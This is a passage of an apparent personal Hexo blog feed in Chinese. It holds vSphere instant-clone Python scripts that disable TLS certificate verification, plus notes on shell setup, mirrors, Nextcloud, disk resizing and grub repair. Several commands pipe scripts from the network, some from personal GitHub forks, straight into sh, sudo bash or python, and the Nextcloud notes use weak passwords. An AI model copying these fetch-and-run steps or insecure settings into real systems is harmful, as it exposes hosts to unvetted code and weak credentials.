punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>VirtualMachine<span class="token punctuation">]</span><span class="token punctuation">,</span> template_name<span class="token punctuation">,</span> vm_folder<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> vm_template<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Couldn't find the template with the provided name "</span>                        <span class="token string">"'&amp;#123;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>template_name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#写定位置,这里是资源池</span>    InstantClone_location <span class="token operator">=</span> vim<span class="token punctuation">.</span>vm<span class="token punctuation">.</span>RelocateSpec<span class="token punctuation">(</span><span class="token punctuation">)</span>    InstantClone_location<span class="token punctuation">.</span>pool<span class="token operator">=</span>get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>ResourcePool<span class="token punctuation">]</span><span class="token punctuation">,</span> ResourcePool<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#即时克隆参数</span>    InstantClonespec <span class="token operator">=</span> vim<span class="token punctuation">.</span>vm<span class="token punctuation">.</span>InstantCloneSpec<span class="token punctuation">(</span><span class="token punctuation">)</span>    InstantClonespec<span class="token punctuation">.</span>location <span class="token operator">=</span>  InstantClone_location    InstantClonespec<span class="token punctuation">.</span>name <span class="token operator">=</span> new_vm_name    <span class="token comment" spellcheck="true">#即时克隆</span>    InstantClone_task<span class="token operator">=</span>vm_template<span class="token punctuation">.</span>InstantClone<span class="token punctuation">(</span>InstantClonespec<span class="token punctuation">)</span>    tasks<span class="token punctuation">.</span>wait_for_tasks<span class="token punctuation">(</span>si<span class="token punctuation">,</span><span class="token punctuation">[</span>InstantClone_task<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># new_vm = WaitTask(InstantClone_task, 'VM InstantClone task')</span>    <span class="token comment" spellcheck="true">#进行重启</span>    rebook_task<span class="token operator">=</span>InstantClone_task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>result<span class="token punctuation">.</span>RebootGuest<span class="token punctuation">(</span><span class="token punctuation">)</span>    reboot_result <span class="token operator">=</span> WaitTask<span class="token punctuation">(</span>rebook_task<span class="token punctuation">,</span> <span class="token string">'VM Reboot task'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>new_vm_name<span class="token punctuation">,</span>reboot_result<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># tasks.wait_for_tasks(si,[rebook_task])</span>    <span class="token comment" spellcheck="true"># print(new_vm_name,'Reboot ok')</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    new_vm_name_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">,</span><span class="token string">'456'</span><span class="token punctuation">]</span>    template_name<span class="token operator">=</span><span class="token string">'ubuntu18.04_x64_server_base'</span>    ResourcePool<span class="token operator">=</span><span class="token string">'即时克隆'</span>    <span class="token keyword">for</span> new_vm_name <span class="token keyword">in</span> new_vm_name_list<span class="token punctuation">:</span>        instant_clone<span class="token punctuation">(</span>new_vm_name<span class="token punctuation">,</span>template_name<span class="token punctuation">,</span>ResourcePool<span class="token operator">=</span>ResourcePool<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get_infomation.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> common <span class="token keyword">import</span> info<span class="token keyword">import</span> atexit<span class="token keyword">import</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3 <span class="token keyword">as</span> urllib3<span class="token keyword">import</span> ssl<span class="token keyword">from</span> pyVmomi <span class="token keyword">import</span> vim<span class="token keyword">from</span> pyVim<span class="token punctuation">.</span>connect <span class="token keyword">import</span> SmartConnect<span class="token punctuation">,</span> Disconnect<span class="token keyword">def</span> <span class="token function">get_obj</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> vimtype<span class="token punctuation">,</span> name<span class="token punctuation">,</span> folder<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    obj <span class="token operator">=</span> None    infomation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token operator">not</span> folder<span class="token punctuation">:</span>        folder <span class="token operator">=</span> content<span class="token punctuation">.</span>rootFolder    container <span class="token operator">=</span> content<span class="token punctuation">.</span>viewManager<span class="token punctuation">.</span>CreateContainerView<span class="token punctuation">(</span>folder<span class="token punctuation">,</span> vimtype<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> container<span class="token punctuation">.</span>view<span class="token punctuation">:</span>        infomation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token keyword">if</span> item<span class="token punctuation">.</span>name <span class="token operator">==</span> name<span class="token punctuation">:</span>            obj <span class="token operator">=</span> item            <span class="token keyword">break</span>    <span class="token keyword">return</span> obj<span class="token punctuation">,</span> infomation<span class="token comment" spellcheck="true"># 开始连接vcenter</span>si <span class="token operator">=</span> Nonecontext <span class="token operator">=</span> None<span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>ssl<span class="token punctuation">,</span> <span class="token string">'SSLContext'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    context <span class="token operator">=</span> ssl<span class="token punctuation">.</span>SSLContext<span class="token punctuation">(</span>ssl<span class="token punctuation">.</span>PROTOCOL_SSLv23<span class="token punctuation">)</span>    context<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE<span class="token keyword">if</span> context<span class="token punctuation">:</span>    si <span class="token operator">=</span> SmartConnect<span class="token punctuation">(</span>host<span class="token operator">=</span>info<span class="token punctuation">.</span>host<span class="token punctuation">,</span> port<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token operator">=</span>info<span class="token punctuation">.</span>user<span class="token punctuation">,</span>                      pwd<span class="token operator">=</span>info<span class="token punctuation">.</span>password<span class="token punctuation">,</span> sslContext<span class="token operator">=</span>context<span class="token punctuation">)</span>atexit<span class="token punctuation">.</span>register<span class="token punctuation">(</span>Disconnect<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connected to vCenter Server"</span><span class="token punctuation">)</span>content <span class="token operator">=</span> si<span class="token punctuation">.</span>RetrieveContent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取datacenter 信息</span>datacenter<span class="token punctuation">,</span> datacenter_infomation <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>Datacenter<span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">.</span>datacenter_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"datacenter :"</span><span class="token punctuation">,</span> datacenter_infomation<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> datacenter<span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Couldn't find the Datacenter with the provided name "</span> <span class="token string">"'&amp;#123;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>info<span class="token punctuation">.</span>datacenter_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取cluster信息</span>cluster<span class="token punctuation">,</span> cluster_infomation <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>ComputeResource<span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">.</span>cluster_name<span class="token punctuation">,</span> datacenter<span class="token punctuation">.</span>hostFolder<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'cluster_name : '</span><span class="token punctuation">,</span> cluster_infomation<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取资源池信息</span>ResourcePool<span class="token punctuation">,</span> ResourcePool_infomation <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>ResourcePool<span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">.</span>template_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ResourcePool : '</span><span class="token punctuation">,</span> ResourcePool_infomation<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取vm信息</span>vm_folder <span class="token operator">=</span> datacenter<span class="token punctuation">.</span>vmFoldervm<span class="token punctuation">,</span> vm_infomation <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>VirtualMachine<span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">.</span>template_name<span class="token punctuation">,</span> vm_folder<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'vm : '</span><span class="token punctuation">,</span> vm_infomation<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vsphere </tag>
            
            <tag> instant clone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常用命令</title>
      <link href="/2020/08/11/yi-xie-chang-yong-ming-ling/"/>
      <url>/2020/08/11/yi-xie-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<p>一些常用命令的集合，方便复制粘贴，免得手敲</p><a id="more"></a><h1 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h1><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><pre class="line-numbers language-bash"><code class="language-bash">ip<span class="token operator">=</span>127.0.0.1 <span class="token operator">&amp;&amp;</span> port<span class="token operator">=</span>1080 <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> http_proxy<span class="token operator">=</span><span class="token string">"<span class="token variable">$ip</span>:<span class="token variable">$port</span>/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> https_proxy<span class="token operator">=</span><span class="token string">"https://<span class="token variable">$ip</span>:<span class="token variable">$port</span>/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> config --global http.proxy <span class="token string">"http://<span class="token variable">$ip</span>:<span class="token variable">$port</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> config --global http.proxy <span class="token string">"http://<span class="token variable">$ip</span>:<span class="token variable">$port</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">ip<span class="token operator">=</span>proxy.dopwn.cn <span class="token operator">&amp;&amp;</span> port<span class="token operator">=</span>8080 <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> http_proxy<span class="token operator">=</span><span class="token string">"<span class="token variable">$ip</span>:<span class="token variable">$port</span>/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> https_proxy<span class="token operator">=</span><span class="token string">"http://<span class="token variable">$ip</span>:<span class="token variable">$port</span>/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> config --global http.proxy <span class="token string">"http://<span class="token variable">$ip</span>:<span class="token variable">$port</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> config --global http.proxy <span class="token string">"http://<span class="token variable">$ip</span>:<span class="token variable">$port</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="安装类"><a href="#安装类" class="headerlink" title="安装类"></a>安装类</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><pre class="line-numbers language-bash"><code class="language-bash">sh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.githubusercontent.com/chnxyzz/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker.io<span class="token punctuation">;</span><span class="token function">sudo</span> curl -sSL https://get.daocloud.io/docker <span class="token operator">|</span> sh<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker <span class="token variable">$USER</span><span class="token punctuation">;</span>python3 -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.githubusercontent.com/chnxyzz/linux_install/master/docker/docker_proxy.py<span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gitlab-runner"><a href="#gitlab-runner" class="headerlink" title="gitlab-runner"></a>gitlab-runner</h2><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span class="token function">apt-get</span> <span class="token function">install</span> -y gitlab-runner<span class="token punctuation">;</span>gitlab-runner registry<span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker gitlab-runner<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="换源类"><a href="#换源类" class="headerlink" title="换源类"></a>换源类</h1><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/security.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list <span class="token operator">&amp;&amp;</span> <span class="token function">sed</span> -i <span class="token string">'s/archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup<span class="token punctuation">;</span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span class="token punctuation">;</span>yum makecache<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="centos-epel"><a href="#centos-epel" class="headerlink" title="centos-epel"></a>centos-epel</h2><pre class="line-numbers language-bash"><code class="language-bash">curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/deb.debian.org/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/security.debian.org/mirrors.aliyun.com/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="parrot"><a href="#parrot" class="headerlink" title="parrot"></a>parrot</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">"s/deb.parrot.sh/mirrors.bfsu.edu.cn/g"</span> /etc/apt/sources.list.d/parrot.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">"s/http.kali.org/mirrors.aliyun.com/g"</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre class="line-numbers language-bash"><code class="language-bash">python -m pip <span class="token function">install</span> -i http://mirrors.aliyun.com/pypi/simple <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Dockerfile类"><a href="#Dockerfile类" class="headerlink" title="Dockerfile类"></a>Dockerfile类</h1><h2 id="时间地区"><a href="#时间地区" class="headerlink" title="时间地区"></a>时间地区</h2><pre class="line-numbers language-bash"><code class="language-bash">RUN <span class="token function">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN <span class="token keyword">echo</span> <span class="token string">'Asia/Shanghai'</span> <span class="token operator">></span>/etc/timezone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="输入中文"><a href="#输入中文" class="headerlink" title="输入中文"></a>输入中文</h2><pre class="line-numbers language-bash"><code class="language-bash">ENV LC_ALL C.UTF-8ENV LANG en_US.UTF-8ENV LANGUAGE en_US:enENV TERM <span class="token function">screen</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Bug修复类"><a href="#Bug修复类" class="headerlink" title="Bug修复类"></a>Bug修复类</h1><h2 id="python2-7-jupyter"><a href="#python2-7-jupyter" class="headerlink" title="python2.7 jupyter"></a>python2.7 jupyter</h2><pre class="line-numbers language-bash"><code class="language-bash">LANG<span class="token operator">=</span>zn python -m jupyter notebook<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="一键推送"><a href="#一键推送" class="headerlink" title="一键推送"></a>一键推送</h1><h2 id="hexo-blog"><a href="#hexo-blog" class="headerlink" title="hexo blog"></a>hexo blog</h2><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s <span class="token operator">&amp;&amp;</span> hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> add <span class="token keyword">.</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit -m <span class="token string">"new"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> useful </tag>
            
            <tag> command </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nextcloud</title>
      <link href="/2019/09/26/nextcloud/"/>
      <url>/2019/09/26/nextcloud/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> -y yum-utils device-mapper-persistent-data lvm2；<span class="token function">sudo</span> yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo<span class="token punctuation">;</span>yum <span class="token function">install</span> epel-release<span class="token punctuation">;</span><span class="token function">sudo</span> yum makecache fast<span class="token punctuation">;</span><span class="token function">sudo</span> yum update<span class="token punctuation">;</span><span class="token function">sudo</span> yum <span class="token function">install</span> -y docker-ce<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl start docker<span class="token punctuation">;</span>docker run -d -p 80:80 -v <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>:/var/www/html --restart<span class="token operator">=</span>always nextclouddocker run --name postgres1 -e POSTGRES_PASSWORD<span class="token operator">=</span><span class="token string">'password'</span> -p 5432:5432 -d postgres<span class="token function">apt-get</span> update -y<span class="token punctuation">;</span><span class="token function">apt-get</span> <span class="token function">install</span> postgresql redis-server<span class="token punctuation">;</span>systemctl start postgresql<span class="token punctuation">;</span>systemctl start redis-server<span class="token punctuation">;</span><span class="token function">service</span> postgresql restart<span class="token punctuation">;</span><span class="token function">service</span> redis-server restart<span class="token punctuation">;</span><span class="token function">su</span> - postgresCREATE USER dbuser WITH PASSWORD <span class="token string">'dbuser'</span><span class="token punctuation">;</span>CREATE DATABASE dbuser OWNER dbuser<span class="token punctuation">;</span>GRANT ALL PRIVILEGES ON DATABASE dbuser TO dbuser<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#add redis</span><span class="token string">'memcache.local'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'\\OC\\Memcache\\Redis'</span>,<span class="token string">'redis'</span> <span class="token operator">=</span><span class="token operator">></span> array<span class="token punctuation">(</span><span class="token string">'host'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span>,<span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> 6379,<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>extend hdd in linux with command</title>
      <link href="/2019/09/26/extend-hdd-in-linux-with-command/"/>
      <url>/2019/09/26/extend-hdd-in-linux-with-command/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">df</span> -lh<span class="token function">fdisk</span> /dev/sdaWelcome to <span class="token function">fdisk</span> <span class="token punctuation">(</span>util-linux 2.31.1<span class="token punctuation">)</span>.Changes will remain <span class="token keyword">in</span> memory only, <span class="token keyword">until</span> you decide to <span class="token function">write</span> them.Be careful before using the <span class="token function">write</span> command.GPT PMBR size mismatch <span class="token punctuation">(</span>251658239 <span class="token operator">!=</span> 838860799<span class="token punctuation">)</span> will be corrected by w<span class="token punctuation">(</span>rite<span class="token punctuation">)</span>.GPT PMBR size mismatch <span class="token punctuation">(</span>251658239 <span class="token operator">!=</span> 838860799<span class="token punctuation">)</span> will be corrected by w<span class="token punctuation">(</span>rite<span class="token punctuation">)</span>.Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> help<span class="token punctuation">)</span>: dPartition number <span class="token punctuation">(</span>1,2, default 2<span class="token punctuation">)</span>: 2Partition 2 has been deleted.Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> help<span class="token punctuation">)</span>: nPartition number <span class="token punctuation">(</span>2-128, default 2<span class="token punctuation">)</span>: 1Value out of range.Partition number <span class="token punctuation">(</span>2-128, default 2<span class="token punctuation">)</span>: 2First sector <span class="token punctuation">(</span>4096-838860766, default 4096<span class="token punctuation">)</span>:Last sector, +sectors or +size<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;K,M,G,T,P&amp;#125; (4096-838860766, default 838860766):</span>Created a new partition 2 of <span class="token function">type</span> <span class="token string">'Linux filesystem'</span> and of size 400 GiB.Partition <span class="token comment" spellcheck="true">#2 contains a ext4 signature.</span>Do you want to remove the signature? <span class="token punctuation">[</span>Y<span class="token punctuation">]</span>es/<span class="token punctuation">[</span>N<span class="token punctuation">]</span>o: yThe signature will be removed by a <span class="token function">write</span> command.Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> help<span class="token punctuation">)</span>: wGPT PMBR size mismatch <span class="token punctuation">(</span>251658239 <span class="token operator">!=</span> 838860799<span class="token punctuation">)</span> will be corrected by w<span class="token punctuation">(</span>rite<span class="token punctuation">)</span>.The partition table has been altered.Syncing disks.<span class="token function">reboot</span>resize2fs -f /dev/sda1<span class="token function">df</span> -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>repair grub</title>
      <link href="/2019/09/20/repair-grub/"/>
      <url>/2019/09/20/repair-grub/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="way-1"><a href="#way-1" class="headerlink" title="way 1"></a>way 1</h1><p>failed~</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token function">mount</span> /dev/sda5 /mnt<span class="token function">mount</span> --bind /dev /mnt/dev<span class="token function">mount</span> --bind /dev/pts /mnt/dev/pts<span class="token function">mount</span> --bind /proc /mnt/proc<span class="token function">mount</span> --bind /sys /mnt/sys<span class="token function">chroot</span> /mntgrub-install --root-directory<span class="token operator">=</span>/mnt /dev/sda5grub-install --recheck /dev/sda5update-grub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="way-2"><a href="#way-2" class="headerlink" title="way 2"></a>way 2</h1><p>use ISO to boot and try repair<br>add ppa</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://ppa.launchpad.net/yannubuntu/boot-repair/ubuntu eoan main<span class="token function">sudo</span> apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <span class="token operator">&lt;</span>PUBKEY<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> -y boot-repair <span class="token operator">&amp;&amp;</span> boot-repair<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> repair </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac install pwntools</title>
      <link href="/2019/09/20/mac-install-pwntools/"/>
      <url>/2019/09/20/mac-install-pwntools/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash">conda create -n py27 python<span class="token operator">=</span>2.7<span class="token function">source</span> activate py27MACOS_UNIVERSAL<span class="token operator">=</span>no python -m pip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-7</title>
      <link href="/2019/07/21/pwnable-kr-7/"/>
      <url>/2019/07/21/pwnable-kr-7/</url>
      
